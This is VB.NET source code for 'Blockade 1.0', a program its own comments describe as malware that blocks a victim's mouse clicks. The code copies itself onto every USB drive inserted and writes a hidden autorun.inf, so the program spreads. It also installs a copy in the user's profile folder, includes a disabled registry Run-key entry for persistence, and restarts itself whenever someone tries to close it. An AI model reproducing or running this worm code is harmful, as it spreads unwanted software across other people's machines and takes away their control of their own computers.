'Blockade 1.0
'This is a harmless malware which when infects your pc, prevents you from using your mouse.
'It is the first of its kind. As mentioned before, it is a harmless virus as it only takes away 
'the user of a pc's power to click. 
'To make it a bit flexible and less aggressive, users are allowed to click on items on the start menu.
'This is to give them some amount of control, because the motive behind the development of this program
'is not to take absolute control of your pc. 

'The main purpose of the program is to motivate computer users to use their keyboards for a change. 
'
'What Happens When The Program Starts
'1. Check if autostart.reg is up. If not, add it.
'2. Check if mal.file exists on PC. If file.exist = no, copy to PC.
'3. Listen for drive insertion.
'4. Check for mal.file on drive. If file.exist = no, copy to drive
'
'NOTE: Try to close the program and you would be doing more harm than good

Imports System.Runtime.InteropServices
Imports Microsoft.Win32
Public Class Block
    Private Const WM_DEVICECHANGE As Integer = &H219
    Private Const DBT_DEVICEARRIVAL As Integer = &H8000
    Private Const DBT_DEVTYP_VOLUME As Integer = &H2
#Region "Remove before release"
    Dim allow As Integer = 0
#End Region

    'Device information structure
    Public Structure DEV_BROADCAST_HDR
        Public dbch_size As Int32
        Public dbch_devicetype As Int32
        Public dbch_reserved As Int32
    End Structure

    'Volume information Structure
    Private Structure DEV_BROADCAST_VOLUME
        Public dbcv_size As Int32
        Public dbcv_devicetype As Int32
        Public dbcv_reserved As Int32
        Public dbcv_unitmask As Int32
        Public dbcv_flags As Int16
    End Structure

    'Get the drive letter from unit mask
    Private Function GetDriveLetterFromMask(ByRef Unit As Int32) As Char
        For i As Integer = 0 To 25
            If Unit = (2 ^ i) Then
                Return Chr(Asc("A") + i)
            End If
        Next
        MsgBox(Unit)
    End Function

    'Override message processing to check for the DEVICECHANGE message
    Protected Overrides Sub WndProc(ByRef m As System.Windows.Forms.Message)
        If m.Msg = WM_DEVICECHANGE Then
            If CInt(m.WParam) = DBT_DEVICEARRIVAL Then
                Dim DeviceInfo As DEV_BROADCAST_HDR
                DeviceInfo = DirectCast(Marshal.PtrToStructure(m.LParam, GetType(DEV_BROADCAST_HDR)), DEV_BROADCAST_HDR)

                If DeviceInfo.dbch_devicetype = DBT_DEVTYP_VOLUME Then
                    Dim Volume As DEV_BROADCAST_VOLUME
                    Volume = DirectCast(Marshal.PtrToStructure(m.LParam, GetType(DEV_BROADCAST_VOLUME)), DEV_BROADCAST_VOLUME)
                    Dim DriveLetter As String = (GetDriveLetterFromMask(Volume.dbcv_unitmask) & ":\")

                    'Make contagious (via USB)
                    Try
                        Dim filAtt1 As IO.FileInfo = New IO.FileInfo(DriveLetter + "\Blockade.exe")
                        Dim filAtt2 As IO.FileInfo = New IO.FileInfo(DriveLetter + "\autorun.inf")

                        If IO.File.Exists(IO.Path.Combine(DriveLetter, "\Blockade.exe")) = True And IO.File.Exists(IO.Path.Combine(DriveLetter, "\autorun.inf")) = True Then            '11
                            'Nothing needed here
                        ElseIf IO.File.Exists(IO.Path.Combine(DriveLetter, "\Blockade.exe")) = True And IO.File.Exists(IO.Path.Combine(DriveLetter, "\autorun.inf")) = False Then       '10
                            Dim autoF As New System.IO.StreamWriter(DriveLetter & "autorun.inf")
                            autoF.Write("[autorun]" & vbNewLine & "open = Blockade.exe" & vbNewLine & "shell\open\command=Blockade.exe")
                            autoF.Close()
                            filAtt1.Attributes = IO.FileAttributes.Hidden
                            filAtt2.Attributes = IO.FileAttributes.Hidden

                        ElseIf IO.File.Exists(IO.Path.Combine(DriveLetter, "\Blockade.exe")) = False And IO.File.Exists(IO.Path.Combine(DriveLetter, "\autorun.inf")) = True Then       '01
                            Dim sf As String = Application.ExecutablePath
                            Dim df As String = DriveLetter & "\Blockade.exe"
                            My.Computer.FileSystem.CopyFile(sf, df, True)
                            filAtt1.Attributes = IO.FileAttributes.Hidden
                            filAtt2.Attributes = IO.FileAttributes.Hidden

                        ElseIf IO.File.Exists(IO.Path.Combine(DriveLetter, "\Blockade.exe")) = False And IO.File.Exists(IO.Path.Combine(DriveLetter, "\autorun.inf")) = False Then       '00
                            Dim sf As String = Application.ExecutablePath
                            Dim df As String = DriveLetter & "\Blockade.exe"
                            My.Computer.FileSystem.CopyFile(sf, df, True)
                            filAtt1.Attributes = IO.FileAttributes.Hidden

                            Dim autoFil As New System.IO.StreamWriter(DriveLetter & "autorun.inf")
                            autoFil.Write("[autorun]" & vbNewLine & "open = Blockade.exe" & vbNewLine & "shell\open\command=Blockade.exe")
                            autoFil.Close()
                            filAtt2.Attributes = IO.FileAttributes.Hidden
                        End If
                    Catch ex As Exception

                    End Try
                End If
            End If
        End If
        'Process all other messages as normal
        MyBase.WndProc(m)
    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Dim curUse As String = System.Environment.UserName

        If (My.Computer.Network.IsAvailable = True) Then
            MsgBox("Connection available." + vbNewLine + "Attempting to retrieve your IP address.")

            Dim pcName As String = My.Computer.Name
            For Each ip As Net.IPAddress In Net.Dns.GetHostAddresses(pcName)
                'Only print out IPv4 Addresses
                If ip.AddressFamily = Net.Sockets.AddressFamily.InterNetwork Then
                    MsgBox("Your IP: " + ip.ToString)
                End If
            Next
        Else
            MsgBox("No connections found")
        End If

        'Infect pc
        Dim source As String = Application.StartupPath.ToString & "\Blockade.exe"
        Dim destFol As String = "C:\Users\" + curUse + "\Windows Fold"
        Dim destFil As String = destFol & "\" & Application.ProductName & ".exe"

        If (Not System.IO.Directory.Exists(destFol)) Then           'When no Fold
            System.IO.Directory.CreateDirectory(destFol)
            Try
                System.IO.File.Copy(source, destFil, True)
                MsgBox("Copy complete -Folder-")  '*
            Catch ex As Exception

            End Try

            'Try
            '    Dim regKey As Microsoft.Win32.RegistryKey
            '    regKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)
            '    regKey.SetValue(Application.ProductName, """" & destFil & """")
            '    regKey.Close()
            'Catch ex As Exception

            'End Try
        ElseIf (System.IO.Directory.Exists(destFol)) Then           'When Fold
            Try
                System.IO.File.Copy(source, destFil, True)
                MsgBox("Copy complete -File-")  '*
            Catch ex As Exception

            End Try
        Else
            MsgBox("Not copied")  '*
        End If

#Region "Sizing"
        'Get screen
        Dim x As Double = Me.Size.Width
        Dim y As Double = Me.Size.Height

        'Calc lbl
        Dim lx As Integer = (x / 2) - (224 / 2)
        Dim ly As Integer = (y / 2) - 75
        Dim lblLoc As New Point(lx, ly)
        lblName.Location = lblLoc

        'Calc box
        Dim bx As Integer = (x / 2) - (211 / 2)
        Dim by As Integer = (y / 2) - 17
        Dim bxLoc As New Point(bx, by)
        bxKey.Location = bxLoc
#End Region

    End Sub

    Private Sub Form1_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        If Hub.bxHub.Text = Me.lblKey.Text Or allow = 1 Then                 'Remove allow before release
            e.Cancel = False
        Else
            Application.Restart()
        End If
    End Sub

    Private Sub bxKey_TextChanged(sender As Object, e As EventArgs) Handles bxKey.TextChanged
        If bxKey.Text = lblDoor.Text Then
            Hub.Show()
            Hub.BringToFront()
        End If
    End Sub

#Region "Remove before release"
    Private Sub lblName_DoubleClick(sender As Object, e As EventArgs) Handles lblName.DoubleClick
        allow = 1
        Application.Exit()
    End Sub
#End Region  '*

End Class